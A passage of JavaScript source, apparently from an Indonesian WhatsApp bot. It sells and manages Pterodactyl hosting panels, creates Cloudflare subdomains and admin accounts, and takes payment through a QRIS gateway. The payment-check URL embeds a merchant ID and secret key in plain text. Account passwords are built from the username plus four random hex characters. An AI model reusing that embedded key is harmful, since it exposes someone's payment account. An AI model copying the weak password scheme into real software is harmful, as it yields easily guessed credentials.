`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Ditss.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *#- List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = `00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214621103778158240303UMI51440014ID.CO.QRIS.WWW0215ID20243511142180303UMI5204541153033605802ID5920SKYZOPEDIA OK20882436009SIJUNJUNG61052751162070703A0163042A2F`

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://gateway.elevate.web.id/api/orkut/createpayment?amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Ditss.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get("https://gateway.elevate.web.id/api/orkut/cekstatus?merchant=OK2088243&keyorkut=846854217289281822088243OKCTF5EC133AC4A0C62E4E29B23C43291972")
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Ditss.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ditss.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ditss.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
